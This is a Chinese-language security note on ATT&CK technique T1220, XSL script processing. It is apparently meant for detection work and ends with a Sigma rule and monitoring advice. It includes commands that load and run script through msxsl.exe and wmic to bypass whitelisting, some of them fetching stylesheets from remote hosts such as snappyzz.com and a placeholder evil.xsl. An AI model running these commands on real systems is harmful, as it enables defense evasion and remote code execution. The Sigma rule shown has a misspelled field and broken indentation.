# T1220-win-XSL Script Processing

## 来自ATT&CK的描述

Extensible Stylesheet Language (XSL)是用来描述和渲染XML文件的。为了进行复杂的操作，XSL增加了不同的语言。红队可以使用它来运行二进制代码绕过白名单的检查。和Trusted Developer Utilities相似，msxsl.exe可以在本地或者远程运行JavaScript，虽然msxsl.exe不是默认安装了，但是红队可以打包它并放在客户端。msxsl.exe运行时接收两个参数，XML源文件和XSL stylesheet。既然xsl文件也是一个xml，红队可以使用xsl文件两次，当msxsl.exe运行的时候。红队可以给xml/xsl文件任意的扩展名。

命令行的例子如下:

-   msxsl.exe customers[.]xml script[.]xsl
-   msxsl.exe script[.]xsl script[.]xsl
-   msxsl.exe script[.]jpeg script[.]jpeg

另一种技术叫做Squiblytwo，它使用windows管理工具调用JScript或VBScript在xsl文件中，这个技术也可以执行远程或本地的script，和Regsvr32一样，Squiblydoo也是一个windows信任的工具。

命令行的例子如下:
-   Local File: wmic process list /FORMAT:evil[.]xsl
-   Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”

##  测试案例

无

## 检测日志

Windows安全日志/Sysmon日志

## 测试复现

### 测试1 MSXSL BYPASS USING LOCAL FILES

首先需要下载工具msxsl.exe，目前尚未找到可下载的地址

```
C:\Windows\Temp\msxsl.exe msxslxmlfile.xml msxslscript.xsl
```

尚未复现成功

### 测试2

```
msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.xsl
```

## 日志留痕

可参考Windows 安全日志4688事件说明、Windows Sysmon安全日志1事件说明。

## 检测规则/思路
### sigma规则
```yml
title: windows下使用msxsl.exe加载恶意程序
description: msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过该程序，我们可以执行JavaScript进而执行系统命令。
status: experimental
author: 12306Bro
logsource:
​    product: windows
​    service: security
detection:
​    selection:
​       EventID: 4688 #Windows 安全日志
        Process_name: 'msxsl.exe' #Application Name
        Commanline: 
		         - '*.xsl'
				 - '*.xml'
				 - 'http://*'
​    condition: selection
level: medium
```


### 建议

使用进程监控来监测msxsl.exe和wmic.exe的执行和参数。将这些工具最近的调用与之前已知的良好参数和加载文件的历史进行比较，以确定异常和潜在的恶意活动（例如：URL命令行参数、创建外部网络连接、加载与脚本相关的DLLs）。脚本调用前后使用的命令参数也可能有助于确定被加载的有效载荷的来源和目的。

在一个不用于这些目的的系统上出现msxsl.exe或其他能够实现代理执行的实用程序，通常用于开发、调试和逆向工程，可能是可疑的。

## 参考推荐
MITRE-ATT&CK-T1220

<https://attack.mitre.org/techniques/T1220>

跟着ATT&CK学安全之defense-evasion

<https://snappyjack.github.io/articles/2020-01/%E8%B7%9F%E7%9D%80ATT&CK%E5%AD%A6%E5%AE%89%E5%85%A8%E4%B9%8Bdefense-evasion>

